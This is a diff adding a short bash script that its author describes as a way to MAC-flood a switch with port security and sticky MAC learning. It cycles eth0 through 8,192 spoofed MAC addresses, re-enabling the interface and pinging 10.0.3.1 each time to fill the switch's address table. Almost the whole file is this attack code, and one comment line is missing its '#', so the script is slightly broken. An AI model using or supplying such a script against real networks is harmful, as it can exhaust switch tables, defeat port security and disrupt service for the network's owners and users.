@@ -1,0 +1,31 @@
+#!/bin/bash
+#As I was reading about port secuirty I found my self thinking how would I mac flood with a bash script?
+#This requires very rare circumstances. Port secuirty set with sticky mac due to interface going up and down and max macs as the
+#same size of the mac address table. I doubt this scenario will present it self anywhere but this was what I quickly came up with
+listone="0 1 2 3 4 5 6 7 8 9 a b c d e f"
+listtwo="0 1 2 3 4 5 6 7 8 9 a b c d e f"
+listthree="0 1 2 3 4 5 6 7 8 9 a b c d e f"
+listfour="0 1"
+for w in $listone
+do
+        for x in $listtwo
+        do
+                for y in $listthree
+                do
+                        for z in $listfour
+                        do
+                        ifdown eth0
+                        ifconfig eth0 hw ether 90:99:99:99:$w$x:$y$z
+                        ifup eth0
+                        sleep 32
+                        ping -c 1 10.0.3.1
+                        done
+                done
+        done        
+done
+#sleep is for spanning tree
+below represents the math of the script
+let a=16**3*2
+echo $a
+#test for unique mac addresses- bash thisscript | uniq -u | wc -l 
+#output should be 8192 unique mac addresses
